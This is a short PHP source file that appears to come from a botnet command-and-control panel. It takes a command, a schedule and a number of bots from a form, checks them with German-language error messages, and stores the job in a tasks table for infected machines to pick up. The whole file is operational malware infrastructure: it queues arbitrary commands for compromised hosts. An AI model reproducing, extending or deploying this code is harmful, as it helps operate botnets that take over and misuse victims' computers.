<?php
	include('include/config.php');
	if($_POST['start']) {
		list($date, $time) = explode(' ', trim($_POST['start']));
		$date = explode('.', $date);
		$time = explode(':', $time);
		$starttime = @mktime($time[0], $time[1], 0, $date[1], $date[0], $date[2]);
	} else $starttime = false;
	
	if($_POST['end']) {
		list($date, $time) = explode(' ', trim($_POST['end']));
		$date = explode('.', $date);
		$time = explode(':', $time);
		$endtime = @mktime($time[0], $time[1], 0, $date[1], $date[0], $date[2]);
	} else $endtime = false;
	
	if(!trim($_POST['command'])) echo "<b>Fehler:</b><br />Befehl existiert nicht!";
	elseif(trim($_POST['start']) != date("d.m.Y H:i", $starttime)) echo "<b>Fehler:</b><br />Keine Startzeit angegeben!";
	elseif(intval($_POST['bots']) <= 0)  echo "<b>Error:</b><br />Keine Bot anzahl angegeben!";
	elseif($_POST['type'] != "once" && $_POST['type'] != "until")  echo "<b>Fehler:</b><br />Type of task is not specified!";
	elseif($_POST['type'] == "until" && trim($_POST['end']) != date("d.m.Y H:i", $endtime)) echo "<b>Fehler:</b><br />Keine Endzeit angegeben!";
	else {
	 $cmd = $_POST['cmdtype'].$_POST['command'];
		panel_sql_request("INSERT INTO ".$sql_table['tasks']." (`startTime`, `endTime`, `command`, `botsLeft`, `botsUsed`) VALUES ('".$starttime."', '".($_POST['type'] == "until" ? $endtime : 0)."', '".mysql_escape_string($cmd)."', '".intval(mysql_real_escape_string((int)$_POST['bots']))."', '".intval(mysql_real_escape_string((int)$_POST['bots']))."')");
		echo "<div class='padding'>Task erfolgreich erstellt!</div>";
		return 1;
	}
?>